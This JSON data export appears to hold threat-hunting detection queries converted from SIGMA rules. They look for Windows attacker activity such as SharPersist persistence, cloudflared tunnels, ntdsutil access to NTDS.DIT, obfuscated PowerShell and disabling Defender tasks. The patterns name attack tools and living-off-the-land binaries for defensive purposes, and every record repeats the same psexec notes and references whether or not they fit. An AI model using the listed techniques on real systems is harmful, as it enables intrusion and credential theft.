            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (tgt.process.cmdline contains \"gthread-3.6.dll\" or tgt.process.cmdline contains \"\\Windows\\Temp\\tmp.bat\" or tgt.process.cmdline contains \"sigcmm-2.4.dll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1149
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "HackTool - SharPersist Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\SharPersist.exe\" or tgt.process.displayName=\"SharPersist\") or (tgt.process.cmdline contains \" -t schtask -c \" or tgt.process.cmdline contains \" -t startupfolder -c \") or (tgt.process.cmdline contains \" -t reg -c \" and tgt.process.cmdline contains \" -m add\") or (tgt.process.cmdline contains \" -t service -c \" and tgt.process.cmdline contains \" -m add\") or (tgt.process.cmdline contains \" -t schtask -c \" and tgt.process.cmdline contains \" -m add\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1150
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"cloudflared\" tool to connect back to a tunnel. This was seen used by threat actors to maintain persistence and remote access to compromised networks.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1102",
                "t1090",
                "t1572"
            ],
            "name": "Cloudflared Tunnel Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" tunnel \" and tgt.process.cmdline contains \" run \") and (tgt.process.cmdline contains \"-config \" or tgt.process.cmdline contains \"-credentials-contents \" or tgt.process.cmdline contains \"-credentials-file \" or tgt.process.cmdline contains \"-token \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1151
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon or suspicious child processes spawning from a WSL process. This could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "WSL Child Process Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\wsl.exe\" or src.process.image.path contains \"\\wslhost.exe\") and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"C:\\Users\\Public\\\" or tgt.process.image.path contains \"C:\\Windows\\Temp\\\" or tgt.process.image.path contains \"C:\\Temp\\\" or tgt.process.image.path contains \"\\Downloads\\\" or tgt.process.image.path contains \"\\Desktop\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1152
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Uses the .NET InstallUtil.exe application in order to execute image without log",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Execution of InstallUtil Without Log",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\InstallUtil.exe\" and tgt.process.image.path contains \"Microsoft.NET\\Framework\" and (tgt.process.cmdline contains \"/logfile= \" and tgt.process.cmdline contains \"/LogToConsole=false\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1153
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "RunDLL32 Spawning Explorer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\rundll32.exe\" and tgt.process.image.path contains \"\\explorer.exe\") and (not src.process.cmdline contains \"\\shell32.dll,Control_RunDLL\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1154
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Xwizard tool with the \"RunWizard\" flag and a GUID like argument.\nThis utility can be abused in order to run custom COM object created in the registry.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "COM Object Execution via Xwizard.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"RunWizard\" and tgt.process.cmdline matches \"\\\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\\\}\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1155
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious powershell invocations from interpreters or unusual programs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell Invocation From Script Engines",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\wscript.exe\" or src.process.image.path contains \"\\cscript.exe\") and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")) and (not tgt.process.image.path contains \"\\Health Service State\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1156
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1489"
            ],
            "name": "Disable Important Scheduled Task",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/Change\" and tgt.process.cmdline contains \"/TN\" and tgt.process.cmdline contains \"/disable\") and (tgt.process.cmdline contains \"\\Windows\\BitLocker\" or tgt.process.cmdline contains \"\\Windows\\ExploitGuard\" or tgt.process.cmdline contains \"\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" or tgt.process.cmdline contains \"\\Windows\\SystemRestore\\SR\" or tgt.process.cmdline contains \"\\Windows\\UpdateOrchestrator\\\" or tgt.process.cmdline contains \"\\Windows\\Windows Defender\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsBackup\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsUpdate\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1157
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Processes Spawned by Java.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\java.exe\" and (tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\query.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1158
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious processes including shells spawnd from WinRM host process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1190"
            ],
            "name": "Suspicious Processes Spawned by WinRM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\wsmprovhost.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1159
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of rcedit to potentially alter executable PE metadata properties, which could conceal efforts to rename system utilities for defense evasion.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1036",
                "t1027",
                "t1027"
            ],
            "name": "PUA - Potential PE Metadata Tamper Using Rcedit",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rcedit-x64.exe\" or tgt.process.image.path contains \"\\rcedit-x86.exe\") or tgt.process.displayName=\"Edit resources of exe\" or tgt.process.displayName=\"rcedit\") and tgt.process.cmdline contains \"--set-\" and (tgt.process.cmdline contains \"OriginalFileName\" or tgt.process.cmdline contains \"CompanyName\" or tgt.process.cmdline contains \"FileDescription\" or tgt.process.cmdline contains \"ProductName\" or tgt.process.cmdline contains \"ProductVersion\" or tgt.process.cmdline contains \"LegalCopyright\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1160
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1134"
            ],
            "name": "PUA - AdvancedRun Suspicious Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"/EXEFilename\" or tgt.process.cmdline contains \"/CommandLine\") and ((tgt.process.cmdline contains \" /RunAs 8 \" or tgt.process.cmdline contains \" /RunAs 4 \" or tgt.process.cmdline contains \" /RunAs 10 \" or tgt.process.cmdline contains \" /RunAs 11 \") or (tgt.process.cmdline contains \"/RunAs 8\" or tgt.process.cmdline contains \"/RunAs 4\" or tgt.process.cmdline contains \"/RunAs 10\" or tgt.process.cmdline contains \"/RunAs 11\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1161
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\ntdsutil.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1162
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Obfuscated IEX Invocation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline matches \"\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[\" or tgt.process.cmdline matches \"\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[\" or tgt.process.cmdline matches \"\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[\" or tgt.process.cmdline matches \"\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}\" or tgt.process.cmdline matches \"\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name\" or tgt.process.cmdline matches \"\\\\$VerbosePreference\\\\.ToString\\\\(\" or tgt.process.cmdline matches \"\\\\[String\\\\]\\\\s*\\\\$VerbosePreference\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1163
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a command line process that uses explorer.exe to launch arbitrary commands or binaries,\nwhich is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer spawning from \"svchost\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Explorer Process Tree Break",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"/factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b}\" or ((tgt.process.cmdline contains \"explorer.exe\") and (tgt.process.cmdline contains \" -root,\" or tgt.process.cmdline contains \" /root,\" or tgt.process.cmdline contains \" \u2013root,\" or tgt.process.cmdline contains \" \u2014root,\" or tgt.process.cmdline contains \" \u2015root,\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1164
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
